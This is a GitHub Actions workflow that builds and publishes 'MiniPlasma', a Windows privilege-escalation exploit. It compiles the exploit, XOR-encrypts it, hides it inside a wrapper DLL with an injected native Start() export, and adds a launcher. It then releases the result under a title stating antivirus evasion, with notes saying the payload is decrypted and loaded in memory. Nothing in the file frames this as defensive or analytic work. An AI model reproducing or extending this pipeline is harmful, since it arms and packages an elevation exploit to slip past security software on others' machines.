name: Build MiniPlasma

on:
  workflow_dispatch:
  push:
    branches: [main]
    paths: ['.github/workflows/build-miniplasma.yml']

permissions:
  contents: write

jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup MSBuild
        uses: microsoft/setup-msbuild@v2

      - name: Restore NuGet packages
        shell: pwsh
        run: |
          Remove-Item -Recurse -Force MiniPlasma\packages -ErrorAction SilentlyContinue
          nuget restore MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP.sln -PackagesDirectory MiniPlasma\packages

      # ── Build inner EXE (full exploit, Costura single-file) ───────────────
      - name: Build inner EXE (exploit payload)
        run: >
          msbuild MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP.sln
          /p:Configuration=Release /p:Platform="Any CPU"
          /p:SignManifests=false /p:Optimize=true

      # ── XOR-encrypt inner EXE + build wrapper DLL ─────────────────────────
      - name: Build wrapper DLL (XOR-encrypted payload + Start() stub)
        shell: pwsh
        run: |
          $innerExe = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\bin\Release\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
          $wrDir = "$env:TEMP\wrapper"
          New-Item -ItemType Directory -Force $wrDir | Out-Null

          # XOR-encrypt the inner EXE with a random key
          $bytes = [IO.File]::ReadAllBytes($innerExe)
          $key = Get-Random -Minimum 1 -Maximum 255
          for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key }
          [IO.File]::WriteAllBytes("$wrDir\payload.enc", $bytes)
          Write-Output "Encrypted $($bytes.Length) bytes with key $key"

          # WrapperExport.cs template (XORKEY substituted with actual key)
          $tplB64 = ""
          $src = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($tplB64)).Replace("XORKEY", $key.ToString())
          [IO.File]::WriteAllText("$wrDir\WrapperExport.cs", $src, [Text.Encoding]::UTF8)

          # DllExportStub.cs
          $stubB64 = "bmFtZXNwYWNlIFJHaWVzZWNrZS5EbGxFeHBvcnQKewogICAgW1N5c3RlbS5BdHRyaWJ1dGVVc2FnZShTeXN0ZW0uQXR0cmlidXRlVGFyZ2V0cy5NZXRob2QpXQogICAgaW50ZXJuYWwgc2VhbGVkIGNsYXNzIERsbEV4cG9ydEF0dHJpYnV0ZSA6IFN5c3RlbS5BdHRyaWJ1dGUKICAgIHsKICAgICAgICBwdWJsaWMgRGxsRXhwb3J0QXR0cmlidXRlKHN0cmluZyBuYW1lKSB7IH0KICAgIH0KfQ=="
          [IO.File]::WriteAllBytes("$wrDir\DllExportStub.cs", [Convert]::FromBase64String($stubB64))

          # Compile wrapper DLL directly with csc.exe (x64 library, payload.enc embedded)
          $csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
          $rawDll = "$wrDir\wrapper_raw.dll"
          & $csc /nologo /optimize /target:library /platform:x64 `
              "/out:$rawDll" `
              "/res:$wrDir\payload.enc,PoC_AbortHydration_ArbitraryRegKey_EoP.payload.enc" `
              "$wrDir\WrapperExport.cs" "$wrDir\DllExportStub.cs"
          if ($LASTEXITCODE -ne 0) { throw "csc wrapper build failed" }
          Write-Output "Wrapper raw DLL: $((Get-Item $rawDll).Length) bytes"

          # Store path for next step
          Write-Output "WRAPPER_RAW_DLL=$rawDll" >> $env:GITHUB_ENV

      # ── Inject Start() export via ildasm/ilasm ────────────────────────────
      - name: Inject native Start() export (ildasm + ilasm)
        shell: pwsh
        run: |
          $dllIn = $env:WRAPPER_RAW_DLL
          $work  = "$env:TEMP\il_export"
          Remove-Item -Recurse -Force $work -ErrorAction SilentlyContinue
          New-Item -ItemType Directory -Force $work | Out-Null

          $ildasm = Get-ChildItem "C:\Program Files (x86)\Microsoft SDKs\Windows" -Recurse -Filter "ildasm.exe" -ErrorAction SilentlyContinue |
                    Where-Object { $_.FullName -notmatch "arm" } |
                    Sort-Object { if ($_.FullName -match "x64") { 0 } else { 1 } } |
                    Select-Object -First 1
          if (-not $ildasm) { throw "ildasm.exe not found" }
          $ilasm = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe"
          if (-not (Test-Path $ilasm)) { throw "ilasm.exe not found" }

          $ilPath = "$work\poc.il"
          & $ildasm.FullName /all /nobar "/output=$ilPath" $dllIn
          Write-Output "Disassembled: $((Get-Item $ilPath).Length) bytes"

          $il = [IO.File]::ReadAllText($ilPath)

          $searchFrom = 0; $moduleEnd = -1
          while ($true) {
              $idx = $il.IndexOf("`r`n.module ", $searchFrom)
              if ($idx -lt 0) { break }
              if (-not $il.Substring($idx + 2).StartsWith(".module extern")) {
                  $lineEndIdx = $il.IndexOf("`r`n", $idx + 2)
                  if ($lineEndIdx -lt 0) { $lineEndIdx = $il.Length }
                  $moduleEnd = $lineEndIdx; break
              }
              $searchFrom = $idx + 1
          }
          if ($moduleEnd -ge 0) {
              $vtfixup = "`r`n.vtfixup [1] int64 fromunmanaged at VT_01`r`n.data VT_01 = int64(0)"
              $il = $il.Substring(0, $moduleEnd) + $vtfixup + $il.Substring($moduleEnd)
              Write-Output "vtfixup injected"
          }

          $startSig = "void  Start("; $sigIdx = $il.IndexOf($startSig)
          if ($sigIdx -lt 0) { $startSig = "void Start("; $sigIdx = $il.IndexOf($startSig) }
          if ($sigIdx -ge 0) {
              $cilIdx   = $il.IndexOf("cil managed", $sigIdx)
              $braceIdx = $il.IndexOf("{", $cilIdx)
              if ($braceIdx -ge 0) {
                  $inject = "`r`n    .vtentry 1 : 1`r`n    .export [1] as Start"
                  $il = $il.Substring(0, $braceIdx + 1) + $inject + $il.Substring($braceIdx + 1)
                  Write-Output ".vtentry/.export injected"
              }
          }

          $modIl = "$work\poc_export.il"
          [IO.File]::WriteAllText($modIl, $il)

          $resFile = "$work\poc.res"
          $outDll  = "$work\output.dll"
          $ilasmArgs = @("/dll", "/x64", "/optimize", "/nologo", "/output=$outDll")
          if (Test-Path $resFile) { $ilasmArgs += "/resource=$resFile" }
          $ilasmArgs += $modIl
          & $ilasm @ilasmArgs

          if (Test-Path $outDll) {
              New-Item -ItemType Directory -Force staging | Out-Null
              Copy-Item $outDll "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.dll"
              Write-Output "DLL staged: $((Get-Item "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.dll").Length) bytes"
          } else { throw "ilasm failed" }

      # ── Build thin launcher EXE ────────────────────────────────────────────
      - name: Build thin launcher EXE
        shell: pwsh
        run: |
          $tmpDir = "$env:TEMP\launcher_build"
          New-Item -ItemType Directory -Force $tmpDir | Out-Null

          # Launcher.cs: loads wrapper DLL via UnsafeLoadFrom (works on network shares)
          $launcherB64 = ""
          [IO.File]::WriteAllBytes("$tmpDir\Launcher.cs", [Convert]::FromBase64String($launcherB64))

          $csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
          $exeOut = "$tmpDir\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
          & $csc /nologo /optimize /target:exe /out:$exeOut "$tmpDir\Launcher.cs"
          if ($LASTEXITCODE -ne 0) { throw "csc launcher build failed" }

          Copy-Item $exeOut "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
          Write-Output "EXE staged: $((Get-Item "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.exe").Length) bytes"

      - name: List staging
        shell: pwsh
        run: Get-ChildItem staging\ | Format-Table Name, Length

      # ── Publish release ────────────────────────────────────────────────────
      - name: Create GitHub Release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        shell: pwsh
        run: |
          $tag = "v5.0-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
          gh release create $tag staging\* `
            --title "MiniPlasma v5.0 - XOR-encrypted payload (AV evasion)" `
            --notes "DLL: XOR-encrypted inner EXE embedded, decrypted+loaded in-memory at runtime. EXE: thin launcher. Deploy both files together." `
            --repo $env:GITHUB_REPOSITORY
          Write-Output "Release: $tag"
